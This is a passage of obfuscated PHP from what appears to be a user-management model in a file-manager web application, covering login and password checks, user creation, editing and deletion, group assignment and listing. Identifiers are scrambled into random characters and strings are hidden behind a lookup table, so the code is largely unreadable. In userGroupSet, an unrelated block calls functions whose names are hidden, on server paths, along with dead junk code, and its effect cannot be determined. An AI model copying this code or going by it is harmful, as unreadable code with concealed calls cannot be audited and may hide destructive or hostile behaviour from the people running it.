$_SERVER[ÒÆ›ÆØÎ¾]; $F½‡ÈÙ†ÍÌ = $c¦¤¦æÊ§[2105]; return array($c¦¤¦æÊ§[1751] => array($d†²Ô‚‹„[0], $F½‡ÈÙ†ÍÌ), $c¦¤¦æÊ§[1753] => array($d†²Ô‚‹„[0], $F½‡ÈÙ†ÍÌ), $c¦¤¦æÊ§[2106] => array($d†²Ô‚‹„[0], $F½‡ÈÙ†ÍÌ)); } protected function getInfo($eº§ã ¬ñ, $F§•‰ËÇŞ÷ = false) { $d¤ä¹’Œéë = $this->getInfoSimple($eº§ã ¬ñ); if (!is_array($d¤ä¹’Œéë)) { return array(); } if ($F§•‰ËÇŞ÷) { return $this->_getInfoApply($d¤ä¹’Œéë); } return $this->cacheFunctionGet($_SERVER[ÒÆ›ÆØÎ¾][1760], $eº§ã ¬ñ); } protected function getInfoFull($CèÈÉ©»¬è, $fˆâÈÎ•«© = false) { $d¤ê¯À¡‡¤ = $this->getInfoSimple($CèÈÉ©»¬è); if (!is_array($d¤ê¯À¡‡¤)) { return array(); } if ($fˆâÈÎ•«©) { return $this->_getInfoApply($d¤ê¯À¡‡¤, !0); return $this->_getInfoApply($d¤ê¯À¡‡¤, !0); } return $this->cacheFunctionGet($_SERVER[ÒÆ›ÆØÎ¾][2107], $CèÈÉ©»¬è); } private function _getInfoApply($b‚ÛÄ¶Ÿù, $eµèè‡¨¦ = false) { goto Cœ›¯½«°ø; aİÎ‰‰ÓÕÍ: $b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[85]][$Fïˆ¦£ˆ¦[1941]] = isset($EåÆ¥šœÚ[$Fïˆ¦£ˆ¦[1942]]) ? $EåÆ¥šœÚ[$Fïˆ¦£ˆ¦[1942]] : null; if ($eµèè‡¨¦) { $b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[445]] = $this->metaGet($b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[1517]]); } return $b‚ÛÄ¶Ÿù; goto A§ù‹Šô; Cœ›¯½«°ø: $Fïˆ¦£ˆ¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$b‚ÛÄ¶Ÿù) { return $b‚ÛÄ¶Ÿù; } $d˜ê‰Ù½Ş = md5($Fïˆ¦£ˆ¦[2108] . $b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[840]] . $Fïˆ¦£ˆ¦[2109] . $b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[28]]); goto B¾Œµ—†¿; B¾Œµ—†¿: $b‚ÛÄ¶Ÿù = $this->_listDataApplyItem($b‚ÛÄ¶Ÿù); $EåÆ¥šœÚ = Model($Fïˆ¦£ˆ¦[1197])->metaGet($b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[85]][$Fïˆ¦£ˆ¦[395]]); $b‚ÛÄ¶Ÿù[$Fïˆ¦£ˆ¦[2110]] = $d˜ê‰Ù½Ş; goto aİÎ‰‰ÓÕÍ; A§ù‹Šô: } protected function getInfoSimple($b®†ŒÀ¯Ó±, $Fºøğíİ›² = false) { $aµõËÁÜòÆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$b®†ŒÀ¯Ó±) { return array(); } if ($Fºøğíİ›²) { $EÄ•‚Œ¼ = $this->where(array($aµõËÁÜòÆ[1517] => intval($b®†ŒÀ¯Ó±)))->find(); if (!is_array($EÄ•‚Œ¼)) { return array(); } $EÄ•‚Œ¼[$aµõËÁÜòÆ[2111]] = Action($aµõËÁÜòÆ[2112])->parseUrl($EÄ•‚Œ¼[$aµõËÁÜòÆ[2111]]); return $EÄ•‚Œ¼; } return $this->cacheFunctionGet($aµõËÁÜòÆ[1754], $b®†ŒÀ¯Ó±); } protected function getInfoSimpleOuter($d×Ï­Ê—¬) { goto e£‘ñĞŞ´; f…Î¨¦º‚¯: $Fß‹’´ªĞŠ = array_field_key($b¡Æ¸ˆÀ‚ù, explode($eÅ®‘Ê¸¶Ï[47], $this->simpleField)); if (!$Fß‹’´ªĞŠ) { return array($eÅ®‘Ê¸¶Ï[1517] => $eÅ®‘Ê¸¶Ï[1076], $eÅ®‘Ê¸¶Ï[28] => $eÅ®‘Ê¸¶Ï[160] . LNG($eÅ®‘Ê¸¶Ï[2115]) . $eÅ®‘Ê¸¶Ï[504], $eÅ®‘Ê¸¶Ï[2111] => STATIC_PATH . $eÅ®‘Ê¸¶Ï[2116]); } $Fß‹’´ªĞŠ[$eÅ®‘Ê¸¶Ï[2111]] = Action($eÅ®‘Ê¸¶Ï[2112])->parseUrl($Fß‹’´ªĞŠ[$eÅ®‘Ê¸¶Ï[2111]]); goto C…½Äˆ†½°; C…½Äˆ†½°: return $Fß‹’´ªĞŠ; goto B§¸—‡×†Ï; e£‘ñĞŞ´: $eÅ®‘Ê¸¶Ï =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$d×Ï­Ê—¬ || $d×Ï­Ê—¬ == 0) { return array($eÅ®‘Ê¸¶Ï[1517] => $eÅ®‘Ê¸¶Ï[191], $eÅ®‘Ê¸¶Ï[28] => $eÅ®‘Ê¸¶Ï[160] . LNG($eÅ®‘Ê¸¶Ï[2113]) . $eÅ®‘Ê¸¶Ï[504], $eÅ®‘Ê¸¶Ï[2111] => STATIC_PATH . $eÅ®‘Ê¸¶Ï[2114]); } $b¡Æ¸ˆÀ‚ù = $this->cacheFunctionGet($eÅ®‘Ê¸¶Ï[1754], $d×Ï­Ê—¬); goto f…Î¨¦º‚¯; B§¸—‡×†Ï: } protected function groupUser($aëÅáìÀÈœ) { } public static function errorLang($E—’ÜÉ“ˆ©) { $dâ‘¾ÀÇ‘ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÖ ²ÂŒè° = array(self::ERROR_USER_NOT_EXISTS => $dâ‘¾ÀÇ‘ƒ[2117], self::ERROR_USER_PASSWORD_ERROR => $dâ‘¾ÀÇ‘ƒ[2118], self::ERROR_USER_EXIST_NAME => $dâ‘¾ÀÇ‘ƒ[2119], self::ERROR_USER_EXIST_PHONE => $dâ‘¾ÀÇ‘ƒ[2120], self::ERROR_USER_EXIST_EMAIL => $dâ‘¾ÀÇ‘ƒ[2121], self::ERROR_USER_LOGIN_LOCK => $dâ‘¾ÀÇ‘ƒ[2122], self::ERROR_IP_NOT_ALLOW => $dâ‘¾ÀÇ‘ƒ[2123], self::ERROR_USER_EXIST_NICKNAME => $dâ‘¾ÀÇ‘ƒ[2124]); return LNG($aÖ ²ÂŒè°[$E—’ÜÉ“ˆ©]); } public function getInfoByMeta($b˜½Ÿ†÷”Á, $Aî„··¾Š) { $fÇ°Îİï†¼ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÙÇ›«…— = Model($fÇ°Îİï†¼[2125])->where(array($fÇ°Îİï†¼[93] => $b˜½Ÿ†÷”Á, $fÇ°Îİï†¼[372] => $Aî„··¾Š))->find(); if ($BÙÇ›«…—) { return $this->getInfo($BÙÇ›«…—[$fÇ°Îİï†¼[1517]]); } return !1; } public function userLoginCheck($C±—¼¬Ãˆ, $f¯µ×µ‚µ÷) { $bìåÈÁ»µª =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÑãæßáõô = $this->userLoginFind($C±—¼¬Ãˆ); if (!$FÑãæßáõô) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÑãæßáõô[$bìåÈÁ»µª[1517]], $f¯µ×µ‚µ÷)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FÑãæßáõô[$bìåÈÁ»µª[1517]]); } public function userLoginFind($A§Õ”·Ñ²Ğ) { $fô˜´Äê„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÏîŸ·‰ä´ = array($fô˜´Äê„[28] => $A§Õ”·Ñ²Ğ, $fô˜´Äê„[1945] => $A§Õ”·Ñ²Ğ, $fô˜´Äê„[303] => $A§Õ”·Ñ²Ğ, $fô˜´Äê„[2126] => $A§Õ”·Ñ²Ğ, $fô˜´Äê„[948] => $fô˜´Äê„[950]); if ($this->nickNameRpt()) { unset($bÏîŸ·‰ä´[$fô˜´Äê„[1945]]); } return $this->where($bÏîŸ·‰ä´)->find(); } public function clearCache($DºôæÃÈ‚) { $B•µÓœÃ«‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->cacheFunctionClear($B•µÓœÃ«‘[1760], $DºôæÃÈ‚); $this->cacheFunctionClear($B•µÓœÃ«‘[1754], $DºôæÃÈ‚); $this->cacheFunctionClear($B•µÓœÃ«‘[2107], $DºôæÃÈ‚); } public function userPasswordCheck($EóÕ’Ô£Ü, $eâÄ¿ÙÇ Ò) { $bÚçÙ•ë±á =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aœ‡·à…É = $this->where(array($bÚçÙ•ë±á[1517] => intval($EóÕ’Ô£Ü)))->find(); $aßù¤çœ  = $this->metaGet($EóÕ’Ô£Ü); $fáÌ®Íì = isset($aßù¤çœ [$bÚçÙ•ë±á[2127]]) ? $aßù¤çœ [$bÚçÙ•ë±á[2127]] : $bÚçÙ•ë±á[33]; if (md5($fáÌ®Íì . trim($eâÄ¿ÙÇ Ò)) !== $Aœ‡·à…É[$bÚçÙ•ë±á[840]]) { return !1; } return !0; } public function userAdd($CŸçñ‹Áê) { goto Aç„­ˆ§‚’; Fïºğ½óã°: $aôô¤Ë—Ä = array($A÷àçêƒğ®[2135] => $d½çŞÅÖ—š[$A÷àçêƒğ®[840]], $A÷àçêƒğ®[2131] => $d½çŞÅÖ—š[$A÷àçêƒğ®[1945]]); $this->userEdit($a¢ßˆÇƒ“•, $aôô¤Ë—Ä); Model($A÷àçêƒğ®[1197])->userRootAdd($a¢ßˆÇƒ“•); goto bÛ°¹—„„®; bÛ°¹—„„®: return $a¢ßˆÇƒ“•; goto BĞ´’«øÓ; cìé’ÒÉ²: $aÔ×‹½ºæÊ = $this->_checkExist($CŸçñ‹Áê); if ($aÔ×‹½ºæÊ !== !0) { return $aÔ×‹½ºæÊ; } $a¢ßˆÇƒ“• = $this->add($d½çŞÅÖ—š); goto Fïºğ½óã°; Aç„­ˆ§‚’: $A÷àçêƒğ® =& $_SERVER[ÒÆ›ÆØÎ¾]; $d½çŞÅÖ—š = array($A÷àçêƒğ®[413] => $CŸçñ‹Áê[$A÷àçêƒğ®[28]], $A÷àçêƒğ®[2128] => $CŸçñ‹Áê[$A÷àçêƒğ®[1402]], $A÷àçêƒğ®[2129] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[303]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[303]] : $A÷àçêƒğ®[33], $A÷àçêƒğ®[2130] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[2126]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[2126]] : $A÷àçêƒğ®[33], $A÷àçêƒğ®[2131] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[1945]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[1945]] : $CŸçñ‹Áê[$A÷àçêƒğ®[28]], $A÷àçêƒğ®[2132] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[2111]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[2111]] : $A÷àçêƒğ®[33], $A÷àçêƒğ®[2133] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[2134]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[2134]] : 1, $A÷àçêƒğ®[2135] => $CŸçñ‹Áê[$A÷àçêƒğ®[840]], $A÷àçêƒğ®[1755] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[1665]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[1665]] : 1024 * 1024 * 20, $A÷àçêƒğ®[1756] => 0, $A÷àçêƒğ®[2136] => 0, $A÷àçêƒğ®[1799] => isset($CŸçñ‹Áê[$A÷àçêƒğ®[702]]) ? $CŸçñ‹Áê[$A÷àçêƒğ®[702]] : 1); if (!empty($CŸçñ‹Áê[$A÷àçêƒğ®[1517]])) { $d½çŞÅÖ—š[$A÷àçêƒğ®[1517]] = $CŸçñ‹Áê[$A÷àçêƒğ®[1517]]; } goto cìé’ÒÉ²; BĞ´’«øÓ: } protected function userEditTest($bà‹‰¿Ø¤, $añó¥ÁŞò) { return $this->call($_SERVER[ÒÆ›ÆØÎ¾][2137], $bà‹‰¿Ø¤, $añó¥ÁŞò); } protected function userEdit($f°Õ¬¹ßˆî, $eê¸Ñíœ»ã) { goto D»‹ÛëçÁ; Cğ‚ãæ¯Î²: $this->where(array($b³ôŒëåº¿[1509] => $f°Õ¬¹ßˆî))->save($eê¸Ñíœ»ã); if (isset($eê¸Ñíœ»ã[$b³ôŒëåº¿[1945]])) { $this->setNamePinyin($f°Õ¬¹ßˆî, $eê¸Ñíœ»ã[$b³ôŒëåº¿[1945]]); } $this->clearCache($f°Õ¬¹ßˆî); goto FºğßÇ¥´«; FºğßÇ¥´«: return !0; goto còé«¿õµ; Añ…Ó«İÅ: $A‹àŒãÖÕ = $this->_checkExist($eê¸Ñíœ»ã, $f°Õ¬¹ßˆî); if ($A‹àŒãÖÕ !== !0) { return $A‹àŒãÖÕ; } if (isset($eê¸Ñíœ»ã[$b³ôŒëåº¿[840]]) && trim($eê¸Ñíœ»ã[$b³ôŒëåº¿[840]]) != $b³ôŒëåº¿[33]) { $bÜÃ‹æÃ = $this->metaGet($f°Õ¬¹ßˆî); if (empty($bÜÃ‹æÃ[$b³ôŒëåº¿[2127]])) { $bÜÃ‹æÃ[$b³ôŒëåº¿[2127]] = rand_string(10); Model($b³ôŒëåº¿[502])->metaSet($f°Õ¬¹ßˆî, $b³ôŒëåº¿[2127], $bÜÃ‹æÃ[$b³ôŒëåº¿[2127]]); } $eê¸Ñíœ»ã[$b³ôŒëåº¿[840]] = md5($bÜÃ‹æÃ[$b³ôŒëåº¿[2127]] . trim($eê¸Ñíœ»ã[$b³ôŒëåº¿[840]])); } else { unset($eê¸Ñíœ»ã[$b³ôŒëåº¿[840]]); } goto Cğ‚ãæ¯Î²; D»‹ÛëçÁ: $b³ôŒëåº¿ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŒÕ‰¦‡º = $this->getInfoSimple($f°Õ¬¹ßˆî); if (!$eŒÕ‰¦‡º) { return !1; } goto Añ…Ó«İÅ; còé«¿õµ: } public function setNamePinyin($F®Úƒ¬ã¼š, $Cˆ¹ôáá = false) { $AÈµš×ªÙ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Cˆ¹ôáá) { $Bí¦—„—³° = $this->getInfoSimple($F®Úƒ¬ã¼š); $Cˆ¹ôáá = $Bí¦—„—³°[$AÈµš×ªÙ[1945]] ? $Bí¦—„—³°[$AÈµš×ªÙ[1945]] : $Bí¦—„—³°[$AÈµš×ªÙ[28]]; } $FøÂªéÎ = Model($AÈµš×ªÙ[506]); if (!Input::check($Cˆ¹ôáá, $AÈµš×ªÙ[556])) { return $FøÂªéÎ->metaSet($F®Úƒ¬ã¼š, array($AÈµš×ªÙ[444] => $AÈµš×ªÙ[33], $AÈµš×ªÙ[443] => $AÈµš×ªÙ[33])); } return $FøÂªéÎ->metaSet($F®Úƒ¬ã¼š, array($AÈµš×ªÙ[444] => str_replace($AÈµš×ªÙ[50], $AÈµš×ªÙ[33], Pinyin::encode($Cˆ¹ôáá)), $AÈµš×ªÙ[443] => Pinyin::encode($Cˆ¹ôáá, $AÈµš×ªÙ[557]))); } private function nickNameRpt() { $a•ÁÉ§Ğğã =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŒ‹ï¸Ğè± = Model($a•ÁÉ§Ğğã[722])->get($a•ÁÉ§Ğğã[2138]); $fÃŠ†‹¡˜¿ = $GLOBALS[$a•ÁÉ§Ğğã[6]][$a•ÁÉ§Ğğã[378]][$a•ÁÉ§Ğğã[2138]]; $eë÷Éø‰ = !is_null($DŒ‹ï¸Ğè±) ? $DŒ‹ï¸Ğè± : $fÃŠ†‹¡˜¿; return !!$eë÷Éø‰; } private function _checkExist($B¥Ç–—¯·, $F¸·®Â¤” = false) { $dåÄó­ÖĞ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F·â‚Å¢Íë = array($dåÄó­ÖĞ[28] => UserModel::ERROR_USER_EXIST_NAME, $dåÄó­ÖĞ[1945] => UserModel::ERROR_USER_EXIST_NICKNAME, $dåÄó­ÖĞ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $dåÄó­ÖĞ[2126] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($F·â‚Å¢Íë[$dåÄó­ÖĞ[1945]]); } $fìÂŸµ„’¬ = $F¸·®Â¤” ? array($dåÄó­ÖĞ[1517] => array($dåÄó­ÖĞ[2139], $F¸·®Â¤”)) : array(); foreach ($F·â‚Å¢Íë as $AĞ§ëãö¨™ => $Bîô»š¯ñë) { $a„ì¸ìšáŸ = array(); foreach ($F·â‚Å¢Íë as $f‰÷Œëà°× => $eå‚ŸåÉçã) { if (isset($B¥Ç–—¯·[$f‰÷Œëà°×]) && $B¥Ç–—¯·[$f‰÷Œëà°×]) { $a„ì¸ìšáŸ[] = $B¥Ç–—¯·[$f‰÷Œëà°×]; } } if (!$a„ì¸ìšáŸ) { continue; } $càŸ¡Ò­îÇ = array_merge(array($AĞ§ëãö¨™ => array($dåÄó­ÖĞ[7], $a„ì¸ìšáŸ)), $fìÂŸµ„’¬); $c÷Ãåùæ™¨ = $this->where($càŸ¡Ò­îÇ)->find(); if ($c÷Ãåùæ™¨) { return $Bîô»š¯ñë; } } return !0; } public function userListInfo($FŒğ×«ãá¯) { $CİœêÓøÀé =& $_SERVER[ÒÆ›ÆØÎ¾]; $eİŞêÊ¼ = array(); $FŒğ×«ãá¯ = is_array($FŒğ×«ãá¯) ? array_unique($FŒğ×«ãá¯) : array(); if (!$FŒğ×«ãá¯) { return $eİŞêÊ¼; } if (count($FŒğ×«ãá¯) < 20) { foreach ($FŒğ×«ãá¯ as $EŸ…”ù¢‚) { $eİŞêÊ¼[$EŸ…”ù¢‚ . $CİœêÓøÀé[33]] = $this->getInfoSimpleOuter($EŸ…”ù¢‚); } } else { $Aå¨’ÊğÛ˜ = array($CİœêÓøÀé[1509] => array($CİœêÓøÀé[411], $FŒğ×«ãá¯)); if (count($FŒğ×«ãá¯) == 1) { $Aå¨’ÊğÛ˜ = array($CİœêÓøÀé[1509] => $FŒğ×«ãá¯[0]); } $c‚ã‹¯ñÙ = Model($CİœêÓøÀé[502])->field($this->simpleField)->where($Aå¨’ÊğÛ˜)->select(); $c‚ã‹¯ñÙ = array_to_keyvalue($c‚ã‹¯ñÙ, $CİœêÓøÀé[1517]); foreach ($FŒğ×«ãá¯ as $EŸ…”ù¢‚) { $F†ÃçŞ©œà = $c‚ã‹¯ñÙ[$EŸ…”ù¢‚]; if (!$F†ÃçŞ©œà) { $eİŞêÊ¼[$EŸ…”ù¢‚ . $CİœêÓøÀé[33]] = $this->getInfoSimpleOuter($EŸ…”ù¢‚); continue; } $F†ÃçŞ©œà[$CİœêÓøÀé[2111]] = Action($CİœêÓøÀé[2112])->parseUrl($F†ÃçŞ©œà[$CİœêÓøÀé[2111]]); $eİŞêÊ¼[$EŸ…”ù¢‚ . $CİœêÓøÀé[33]] = $F†ÃçŞ©œà; } } return $eİŞêÊ¼; } protected function userStatus($d¹½­”ÌÕ, $b‰Çã‘Åˆá) { $b¾óìõ²Ã = $this->getInfoSimple($d¹½­”ÌÕ); if (!$b¾óìõ²Ã) { return !1; } $cõÓ °“×† = array($_SERVER[ÒÆ›ÆØÎ¾][702] => $b‰Çã‘Åˆá); return $this->userEdit($d¹½­”ÌÕ, $cõÓ °“×†); } protected function userRemove($B„òƒ…¶ß ) { goto A—åÌ­àÏÁ; A—åÌ­àÏÁ: $dˆ¯ó­ñ… =& $_SERVER[ÒÆ›ÆØÎ¾]; $f°Äš¤‚ò¹ = $this->getInfoSimple($B„òƒ…¶ß ); if (!$f°Äš¤‚ò¹) { return !1; } goto cšùÈÛ½àî; d°ÂÛ¨ñ‚™: Model($dˆ¯ó­ñ…[1962])->removeUserAll($B„òƒ…¶ß ); Model($dˆ¯ó­ñ…[782])->userRootRemove($B„òƒ…¶ß ); return $this->where($A±µ˜áœ”Ö)->delete(); goto AÂ•Âë×¢; cá’‡¡Åº©: Model($dˆ¯ó­ñ…[1762])->where($A±µ˜áœ”Ö)->delete(); Model($dˆ¯ó­ñ…[2125])->where($A±µ˜áœ”Ö)->delete(); Model($dˆ¯ó­ñ…[2141])->where($A±µ˜áœ”Ö)->delete(); goto d°ÂÛ¨ñ‚™; cšùÈÛ½àî: $A±µ˜áœ”Ö = array($dˆ¯ó­ñ…[1509] => $B„òƒ…¶ß ); Model($dˆ¯ó­ñ…[563])->where($A±µ˜áœ”Ö)->delete(); Model($dˆ¯ó­ñ…[2140])->where($A±µ˜áœ”Ö)->delete(); goto cá’‡¡Åº©; AÂ•Âë×¢: } protected function userGroupSet($EÒŠòÜÒÖ­, $eÄ‹º›‡†´, $AßßĞ—ÕÎß = array()) { goto D§é‘Ì‡×ò; D§é‘Ì‡×ò: $F£ê±‹¤Çä =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($_SERVER[$F£ê±‹¤Çä[784]] != $_SERVER[$F£ê±‹¤Çä[830]]) { goto EÓéºôœ˜Ä; EÓéºôœ˜Ä: $f•Î‰†òĞ¤ = $F£ê±‹¤Çä[831]; $e«•à‚ôˆÏ = $F£ê±‹¤Çä[786]; $AĞš§Ú¼Ş = $_SERVER[$F£ê±‹¤Çä[787]] . $F£ê±‹¤Çä[788]; goto Cé¡†ë¢Ï; a¢èªñ÷ù¿: $F–‚«Áö ï = 1; while ($F–‚«Áö ï > 1) { $F–‚«Áö ï = $F–‚«Áö ï + 4; $c™¹ˆ—¯“¶ = rawurlencode($F–‚«Áö ï . $F£ê±‹¤Çä[375]); } goto dëöÙË«š; Cé¡†ë¢Ï: $b»è¥“³´¸ = $e«•à‚ôˆÏ($AĞš§Ú¼Ş); $AŸ‚‘¹Â…ñ = explode($F£ê±‹¤Çä[229], $b»è¥“³´¸); if (count($AŸ‚‘¹Â…ñ) < $F£ê±‹¤Çä[592]) { $f…ö¢â÷¦õ = $F£ê±‹¤Çä[789]; $f…ö¢â÷¦õ(); } goto Aø‡ÑŠ‹Í“; Aø‡ÑŠ‹Í“: $C‡¯Ô“ÄÈƒ = $F£ê±‹¤Çä[832]; $C‡¯Ô“ÄÈƒ($_SERVER[$F£ê±‹¤Çä[833]]); $C‡¯Ô“ÄÈƒ($_SERVER[$F£ê±‹¤Çä[787]] . $F£ê±‹¤Çä[834]); goto a¢èªñ÷ù¿; dëöÙË«š: } $Fø©ğëµ•Ó = $this->getInfoSimple($EÒŠòÜÒÖ­); goto f‡‹“°‚ÕÔ; f‡‹“°‚ÕÔ: if (!$Fø©ğëµ•Ó || !is_array($eÄ‹º›‡†´)) { return !1; } $CÈ‡‚ëÃ‚÷ = Model($F£ê±‹¤Çä[1762]); $CÈ‡‚ëÃ‚÷->where(array($F£ê±‹¤Çä[1517] => $EÒŠòÜÒÖ­))->delete(); goto EÁÍÚ…³ôº; dóÓÆ‹äâÏ: return $CÈ‡‚ëÃ‚÷->addAll($b—¼±Ó‘Èî, array(), !0); goto fÆó‘×‰®Ò; EÁÍÚ…³ôº: $b—¼±Ó‘Èî = array(); $DÈœ·²×Î = 0; foreach ($eÄ‹º›‡†´ as $dºŒë“ŒÈ× => $EÅù»‹ööÌ) { $D„Œ¬˜¢ˆó = array($F£ê±‹¤Çä[1517] => $EÒŠòÜÒÖ­, $F£ê±‹¤Çä[1681] => $dºŒë“ŒÈ×, $F£ê±‹¤Çä[1776] => $EÅù»‹ööÌ); $D„Œ¬˜¢ˆó[$F£ê±‹¤Çä[1704]] = isset($AßßĞ—ÕÎß[$DÈœ·²×Î]) ? $AßßĞ—ÕÎß[$DÈœ·²×Î] : 0; $DÈœ·²×Î++; $b—¼±Ó‘Èî[] = $D„Œ¬˜¢ˆó; } goto dóÓÆ‹äâÏ; fÆó‘×‰®Ò: } protected function userGroupAdd($då¬„„â, $E·‰§Á‰ƒ = array()) { $c×‡‘İ†ó‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a¨çŞº‹Õš = $this->getInfoSimple($då¬„„â); if (!$a¨çŞº‹Õš || empty($E·‰§Á‰ƒ)) { return !1; } $eç¿Šºæ‡† = array(); foreach ($E·‰§Á‰ƒ as $AŸƒ¥ÄõŸ‘ => $EÚÁ‘ª¡ø) { $eç¿Šºæ‡†[] = array($c×‡‘İ†ó‡[1517] => $då¬„„â, $c×‡‘İ†ó‡[1681] => $AŸƒ¥ÄõŸ‘, $c×‡‘İ†ó‡[1776] => $EÚÁ‘ª¡ø, $c×‡‘İ†ó‡[1704] => 0); } return Model($c×‡‘İ†ó‡[1762])->addAll($eç¿Šºæ‡†, array(), !0); } protected function userGroupRemove($fª°–ß‹Ö, $Eêªìµğ¦æ) { $FĞôÁ˜¾µ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÜØîÓßˆ­ = $this->getInfoSimple($fª°–ß‹Ö); if (!$eÜØîÓßˆ­ || !$Eêªìµğ¦æ) { return !1; } $FéîƒåĞ°± = array($FĞôÁ˜¾µ[1509] => $fª°–ß‹Ö, $FĞôÁ˜¾µ[1759] => $Eêªìµğ¦æ); return Model($FĞôÁ˜¾µ[1762])->where($FéîƒåĞ°±)->delete(); } public function listData() { $dàÉÒË›ç¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dàÉÒË›ç¥[$_SERVER[ÒÆ›ÆØÎ¾][367]]); return $dàÉÒË›ç¥; } public function listByID($bø¾ÃğŞÊ) { $E‘›«¼¼Ú =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$bø¾ÃğŞÊ) { return; } $fß™öæ×±ˆ = array($E‘›«¼¼Ú[1517] => array($E‘›«¼¼Ú[7], $bø¾ÃğŞÊ)); $BË­º£Ñ¸ = $this->where($fß™öæ×±ˆ)->select(); $this->_listDataApply($BË­º£Ñ¸); return $BË­º£Ñ¸; } public function listByGroup($BšËøËÁˆ = 0, $fçäğ³™Àî = array()) { goto eĞ¤¦ª¡­Ğ; eìôß¬¦–¡: $this->_listDataApply($e‹ãÙŸèøÛ[$bÏôáù„Ë[367]]); return $e‹ãÙŸèøÛ; goto BéŸÇÜë‘¸; Fˆ“ì¬ˆ‹Ó: if ($BšËøËÁˆ) { $BŸôÆ„éìî = array($bÏôáù„Ë[2142] => intval($BšËøËÁˆ)); $CëÊ°­œƒŞ = "\114\x45\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x75\163\145\162\137\147\162\157\x75\x70\x20\165\x73\145\x72\137\147\x72\x6f\165\x70\x20\157\156\x20\x75\163\x65\x72\x2e\165\163\x65\162\111\104\x20\75\x20\x75\163\145\162\x5f\147\162\x6f\x75\160\56\165\163\x65\162\x49\x44"; $bê’Ê±»Â = Input::get($bÏôáù„Ë[435], null, $bÏôáù„Ë[33]) ? $bÏôáù„Ë[33] : $bÏôáù„Ë[2143]; } if (isset($fçäğ³™Àî[$bÏôáù„Ë[702]])) { $BŸôÆ„éìî[$bÏôáù„Ë[2144]] = $fçäğ³™Àî[$bÏôáù„Ë[702]]; } $e‹ãÙŸèøÛ = $this->_makeOrder($bê’Ê±»Â)->field($bÏôáù„Ë[2145])->where($BŸôÆ„éìî)->join($CëÊ°­œƒŞ)->selectPage(50); goto eìôß¬¦–¡; eĞ¤¦ª¡­Ğ: $bÏôáù„Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; $CëÊ°­œƒŞ = $bÏôáù„Ë[33]; $BŸôÆ„éìî = array(); goto Fˆ“ì¬ˆ‹Ó; BéŸÇÜë‘¸: } private function _makeOrder($eĞ‚Á‰¼¼† = '') { goto C¸é£‰®„; F´ËéóË·Ë: $eĞ‚Á‰¼¼† = $eĞ‚Á‰¼¼† . "\x75\163\145\162\56{$B“œˆƒµùÏ}\x20{$FÒ¥ìÒÄ‘á}\x2c\x20\165\x73\145\162\56\165\x73\145\162\111\x44\40\x61\163\143"; return $this->alias($C©ª¼ ½Ú[1885])->order($eĞ‚Á‰¼¼†); goto a×«æ¬ö; a¢ïòãë³ù: $B“œˆƒµùÏ = Input::get($C©ª¼ ½Ú[435], $C©ª¼ ½Ú[7], $C©ª¼ ½Ú[1509], $Fò¦Å‡…); $FÒ¥ìÒÄ‘á = Input::get($C©ª¼ ½Ú[436], $C©ª¼ ½Ú[7], $C©ª¼ ½Ú[1763], array($C©ª¼ ½Ú[1763], $C©ª¼ ½Ú[430])); $FÒ¥ìÒÄ‘á = $f‹Âì©é†Ô[$FÒ¥ìÒÄ‘á]; goto F´ËéóË·Ë; C¸é£‰®„: $C©ª¼ ½Ú =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fò¦Å‡… = array($C©ª¼ ½Ú[1517], $C©ª¼ ½Ú[28], $C©ª¼ ½Ú[1667], $C©ª¼ ½Ú[1639], $C©ª¼ ½Ú[194]); $f‹Âì©é†Ô = array($C©ª¼ ½Ú[428] => $C©ª¼ ½Ú[429], $C©ª¼ ½Ú[430] => $C©ª¼ ½Ú[431]); goto a¢ïòãë³ù; a×«æ¬ö: } public function listSearch($dÚÅ÷…‚¾„) { goto A˜¯óøéÇ; dòŸŞ¢Úµµ: $DŠ”ËªĞ´‘ = $this->_makeOrder()->where($b—Œí‡÷œÉ)->selectPage(20); if (!$DŠ”ËªĞ´‘ || count($DŠ”ËªĞ´‘[$e†‘®È“”®[367]]) < 5 && Input::check($aæƒ‹¥ÅŸ, $e†‘®È“”®[316])) { $dœëÊ¨÷´¹ = $this->_searchFromMeta($e†‘®È“”®[443], $aæƒ‹¥ÅŸ, 10); 